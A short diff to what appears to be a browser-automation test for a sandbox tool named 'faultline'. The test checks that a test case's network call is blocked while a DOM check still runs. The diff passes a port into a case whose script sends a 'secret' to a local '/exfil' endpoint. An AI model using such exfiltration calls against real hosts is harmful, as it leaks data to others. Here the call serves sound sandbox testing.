@@ -20,7 +20,7 @@ try{
   await page.waitForFunction(()=>window.faultline);
 
   let state=await page.evaluate(()=>window.faultline.inspect());
-  state=await page.evaluate(({revision})=>window.faultline.loadCase({
+  state=await page.evaluate(({revision,sinkPort})=>window.faultline.loadCase({
     expectedRevision:revision,
     case:{
       html:'<main id="payload">contained</main>',
@@ -28,7 +28,7 @@ try{
       js:`fetch('http://127.0.0.1:${sinkPort}/exfil?secret=faultline').catch(()=>{});`,
       oracle:{kind:'dom_exists',selector:'#payload',equals:true,action:{kind:'none'},delayMs:120}
     }
-  }),{revision:state.revision});
+  }),{revision:state.revision,sinkPort});
 
   const result=await page.evaluate(({revision})=>window.faultline.run({expectedRevision:revision}),{revision:state.revision});
   assert.equal(result.status,'FAIL','benign DOM oracle should still execute under a network-deny sandbox');
